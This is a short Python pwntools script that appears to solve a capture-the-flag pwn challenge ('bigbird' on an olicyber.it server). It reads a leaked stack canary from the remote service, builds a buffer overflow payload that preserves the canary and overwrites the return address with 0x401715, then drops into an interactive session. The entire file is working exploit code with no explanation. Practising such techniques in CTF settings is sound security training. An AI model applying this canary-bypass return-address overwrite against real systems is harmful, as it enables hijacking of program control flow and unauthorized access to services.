from pwn import *
from Crypto.Util.number import bytes_to_long
r = remote('bigbird.challs.olicyber.it', 12006)

retadd = 0x0000000000401715
r.recvuntil(': ')
canary = int(r.recvline(), 16)
r.recvline()

payload = b'A' * 40
payload += p64(canary)
payload += b'A' * 8
payload += p64(retadd)
r.sendline(payload)

r.interactive()

